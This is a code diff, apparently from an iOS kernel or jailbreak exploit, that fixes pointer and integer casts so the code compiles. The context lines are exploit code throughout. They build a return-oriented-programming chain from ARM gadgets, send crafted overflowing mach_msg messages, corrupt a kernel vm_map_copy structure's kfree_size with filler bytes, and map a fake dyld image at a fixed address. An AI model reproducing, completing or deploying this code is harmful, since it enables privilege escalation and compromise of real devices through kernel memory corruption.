@@ -359,7 +359,7 @@ void process_dyld_file(NSString *srcPath)
             NSData *myData = [inputHdl readDataOfLength:OSSwapInt32(arch->size)];
             
             const uint8_t *headerc =  [myData bytes];
-            uint8_t *header = mmap(0x50000000, round_page([myData length]) + 0x5000000, PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE|MAP_FIXED, 0, 0);
+            uint8_t *header = mmap((void*)0x50000000, round_page([myData length]) + 0x5000000, PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE|MAP_FIXED, 0, 0);
             memcpy(header, headerc, [myData length]);
             
             dump_dyld_segments(header);
@@ -398,7 +398,7 @@ int main(int argc, const char * argv[]) {
     assert(fd > 0);
     ftruncate(fd, (0x10000000));
     char* buf = mmap(NULL, (0x10000000), PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
-    assert(buf != -1);
+    assert(buf != (void *)-1);
     
     /* write mach header */
     
@@ -1205,10 +1205,10 @@ RopCallFunction3(PUSH, @"_mach_msg_trap", SEG_VAR(msg), MACH_SEND_MSG, sizeof(oo
             LoadIntoR0(PUSH, SEG_VAR(tmp1));
             
             PUSH = not_r0_pop_r4r7pc;
-            PUSH = SEG_VAR(tmp2);
+            PUSH = (uint32_t)SEG_VAR(tmp2);
             PUSH = m_m_scratch;
             PUSH = not_r0_pop_r4r7pc;
-            PUSH = SEG_VAR(tmp2);
+            PUSH = (uint32_t)SEG_VAR(tmp2);
             PUSH = m_m_scratch;
             
             
@@ -1269,9 +1269,9 @@ RopCallFunction3(PUSH, @"_mach_msg_trap", SEG_VAR(msg), MACH_SEND_MSG, sizeof(oo
     RecvMsg(PUSH, 480, oflow_msg); // hang
     RopCallFunction2(PUSH, @"___syscall", SYS_exit, 13);
     
-    stack = (char*)stacky;
-    segstackbase = (char*)segstackybase;
-    stackbase = (char*)stack;
+    stack = (uint32_t*)stacky;
+    segstackbase = (uint32_t)segstackybase;
+    stackbase = (uint32_t*)stack;
     PUSH = 0x44444444; // R4
     PUSH = m_m_scratch; // R7
     
@@ -1326,10 +1326,10 @@ RopCallFunction3(PUSH, @"_mach_msg_trap", SEG_VAR(msg), MACH_SEND_MSG, sizeof(oo
             LoadIntoR0(PUSH, SEG_VAR(tmp1));
             
             PUSH = not_r0_pop_r4r7pc;
-            PUSH = SEG_VAR(tmp2);
+            PUSH = (uint32_t)SEG_VAR(tmp2);
             PUSH = m_m_scratch;
             PUSH = not_r0_pop_r4r7pc;
-            PUSH = SEG_VAR(tmp2);
+            PUSH = (uint32_t)SEG_VAR(tmp2);
             PUSH = m_m_scratch;
             
             PUSH = pop_r2pc;
@@ -1389,9 +1389,9 @@ RopCallFunction3(PUSH, @"_mach_msg_trap", SEG_VAR(msg), MACH_SEND_MSG, sizeof(oo
     RecvMsg(PUSH, 480, oflow_msg); // hang
     RopCallFunction2(PUSH, @"___syscall", SYS_exit, 13);
     
-    stack = (char*)stackz;
-    segstackbase = (char*)segstackzbase;
-    stackbase = (char*)stack;
+    stack = (uint32_t*)stackz;
+    segstackbase = (uint32_t)segstackzbase;
+    stackbase = (uint32_t*)stack;
     
     PUSH = 0x44444444; // R4
     PUSH = m_m_scratch; // R7
@@ -1614,7 +1614,7 @@ step(i);\
     memcpy(&argss->oolbuf[1024-0x58], vm_map_copy, 0x58);
     vm_map_copy->kfree_size = 2048;
     
-    strcpy(vm_map_copy + 1, "qwertyoruiopzqwertyoruiopz");
+    strcpy((char *)(vm_map_copy + 1), "qwertyoruiopzqwertyoruiopz");
     
     
     fsz += load_cmd_seg.filesize;
